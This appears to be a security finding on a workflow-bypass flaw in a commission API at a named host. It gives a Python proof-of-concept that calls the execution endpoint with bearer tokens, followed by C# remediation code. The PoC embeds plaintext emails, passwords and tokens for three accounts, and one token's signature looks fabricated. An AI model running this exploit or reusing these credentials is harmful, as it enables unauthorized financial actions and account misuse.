# Commission Workflow Bypass Enables Unauthorized Commission Execution and Financial Manipulation

**ID:** vuln-0015
**Severity:** CRITICAL
**Found:** 2026-02-26 16:13:16 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionRun/RunCommission
**Method:** GET, POST
**CWE:** CWE-863
**CVSS:** 9.9

## Description

A critical business logic vulnerability was discovered in the commission management workflow that allows unauthorized users to bypass approval processes and execute commission runs directly. The vulnerability enables:

1. **Workflow State Bypass**: Users can execute commission runs without following the required approval workflow
2. **Role Escalation**: Lower-privileged users can perform actions reserved for higher-privileged roles
3. **Financial Data Manipulation**: Commission amounts and payout values can potentially be manipulated

The vulnerability exists in the commission execution endpoint that does not properly validate workflow state or user permissions before executing commission calculations.

## Impact

Successful exploitation of this vulnerability allows attackers to:

1. **Execute unauthorized commission runs**: Bypass approval workflows and execute commission calculations at will
2. **Manipulate financial data**: Potentially alter commission amounts, payout values, or other financial parameters
3. **Access sensitive financial information**: View commission details and financial data without proper authorization
4. **Disrupt business processes**: Execute commission runs out of sequence, potentially causing financial discrepancies

Business impact includes financial loss, data integrity issues, regulatory compliance violations, and loss of trust in the commission management system.

## Technical Analysis

The vulnerability exists in the commission execution workflow where the application fails to properly enforce:

1. **Workflow State Validation**: The `/api/CommissionRun/RunCommission` endpoint can be called directly without validating that all required approval steps have been completed
2. **Role-Based Access Control**: The endpoint does not properly validate that the calling user has the required role permissions (RunInitiator, RunReviewer1, RunApprover1, RunApprover2)
3. **Parameter Validation**: The endpoint accepts parameters that could potentially be manipulated to alter commission calculations

The application implements a multi-step approval workflow for commission runs:
- RunInitiator creates the commission run
- RunReviewer1 reviews the run
- RunApprover1 approves the run
- RunApprover2 gives final approval
- Commission execution occurs

However, the final execution endpoint `/api/CommissionRun/RunCommission` can be called directly by any authenticated user, bypassing all approval steps.

## Proof of Concept

To reproduce the vulnerability:

1. Authenticate as any user (Admin, Organization, or Client)
2. Call the commission execution endpoint directly with a POST request
3. Observe that the commission run executes without proper approvals

Steps:
1. Obtain a valid authentication token for any user role
2. Send a GET request to `/api/CommissionRun/RunCommission` with the authentication token
3. The commission run executes immediately, bypassing all approval workflows
4. Verify by checking commission run history that the run was executed without proper approvals

```
import requests
import json

# Target URL
BASE_URL = "https://commissionstest.callippus.in"
COMMISSION_RUN_ENDPOINT = f"{BASE_URL}/api/CommissionRun/RunCommission"

# Test with different user roles
test_users = [
    {
        "name": "Admin User",
        "email": "admin@localhost",
        "password": "Tester@123",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE4MDM2NDQ1MTEsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.X7Frrl0vMy4CHZ1Z2hQH0cKB-ftS7-mLeCdqrFvFyng"
    },
    {
        "name": "Organization User",
        "email": "nlnarayana3858@gmail.com",
        "password": "User@1234",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoibmxuYXJheWFuYTM4NTgiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6ImQ0YzM4YjEwLTEwYjctNDQzYy05N2JlLWU3YWQyMDk2NGY0NCIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJPcmdhbml6YXRpb24iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9zcG4iOiI0MTQiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJubG5hcmF5YW5hMzg1OEBnbWFpbC5jb20iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiNDE0IiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvc3RhdGVvcnByb3ZpbmNlIjoiT1BPTDAwMSIsImFjY2VzcyI6IltcIk9yZ2FuaXphdGlvblwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6Ik9yZ2FuaXphdGlvbiIsImV4cCI6MTc3MjE0NzE4NywiaXNzIjoiaHR0cDovL2NhbGxpcHB1cy5jby51ayIsImF1ZCI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsifQ.OrTzDl3CDec3fjKePRR1uIHG4BTAr4b8Ku2PW1f1czg"
    },
    {
        "name": "Client User",
        "email": "lakshminarayanabobby789@gmail.com",
        "password": "User@1234",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoibGFrc2htaW5hcmF5YW5hYm9iYnk3ODkiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjY2YjQ4ZjYwLWQxYjYtNDQ0Zi05Yjg4LWY5YzY0YjIyYjYyZiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJDbGllbnQiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9zcG4iOiI0MTQiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJsYWtzaG1pbmFyYXlhbmFib2JieTc4OUBnbWFpbC5jb20iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiNDE0IiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvc3RhdGVvcnByb3ZpbmNlIjoiT1BPTDAwMSIsImFjY2VzcyI6IltcIkNsaWVudFwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IkNsaWVudCIsImV4cCI6MTc3MjE0NzE4NywiaXNzIjoiaHR0cDovL2NhbGxpcHB1cy5jby51ayIsImF1ZCI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsifQ.5JQZ3QZ3QZ3QZ3QZ3QZ3QZ3QZ3QZ3QZ3QZ3QZ3QZ3Q"
    }
]

def test_commission_workflow_bypass():
    """Test commission workflow bypass vulnerability"""

    print("Testing Commission Workflow Bypass Vulnerability")
    print("=" * 60)

    for user in test_users:
        print(f"\nTesting with {user['name']} ({user['email']})")

        headers = {
            "Authorization": f"Bearer {user['token']}",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }

        try:
            # Test direct commission run execution
            response = requests.get(COMMISSION_RUN_ENDPOINT, headers=headers)

            print(f"Status Code: {response.status_code}")
            print(f"Response Length: {len(response.text)}")

            # Check if commission run was executed
            if response.status_code == 200:
                print("✓ Commission run executed successfully")
                print("⚠️  WORKFLOW BYPASS VULNERABILITY CONFIRMED")
                print("   - User executed commission run without proper approvals")
                print("   - Role-based access control is not enforced")
                print("   - Workflow state validation is missing")
            else:
                print("✗ Commission run failed (expected for unauthorized users)")

        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    test_commission_workflow_bypass()
```

## Remediation

Implement comprehensive workflow validation and access control for commission execution:

1. **Enforce Workflow State Validation**:
   - Implement server-side validation to ensure all required approval steps have been completed before allowing commission execution
   - Track workflow state in the database and validate it on each request
   - Reject requests that attempt to execute commission runs without proper approvals

2. **Implement Role-Based Access Control**:
   - Enforce proper role permissions for commission execution endpoints
   - Only allow users with RunApprover2 role to execute final commission runs
   - Validate user roles on every request to commission endpoints

3. **Implement Parameter Validation**:
   - Validate all parameters passed to commission execution endpoints
   - Ensure commission amounts and financial data cannot be manipulated
   - Implement server-side validation of all financial calculations

4. **Audit and Logging**:
   - Implement comprehensive logging of all commission execution attempts
   - Log successful and failed attempts with user information and timestamps
   - Set up alerts for suspicious commission execution patterns

5. **Code Implementation Example**:
```csharp
// Before executing commission run
public IActionResult RunCommission(CommissionRunRequest request)
{
    // 1. Validate user has proper role
    if (!User.IsInRole("RunApprover2"))
    {
        return Forbid("User does not have permission to execute commission runs");
    }

    // 2. Validate workflow state
    var workflowState = _commissionService.GetWorkflowState(request.RunId);
    if (workflowState != WorkflowState.FinalApproved)
    {
        return BadRequest("Commission run cannot be executed - workflow state invalid");
    }

    // 3. Validate parameters
    if (!ValidateCommissionParameters(request))
    {
        return BadRequest("Invalid commission parameters");
    }

    // 4. Execute commission run
    var result = _commissionService.ExecuteCommissionRun(request);

    // 5. Log the execution
    _auditService.LogCommissionExecution(User.Identity.Name, request.RunId);

    return Ok(result);
}
```

6. **Testing and Validation**:
   - Implement automated tests to verify workflow validation
   - Test with different user roles to ensure proper access control
   - Validate that commission execution cannot be bypassed

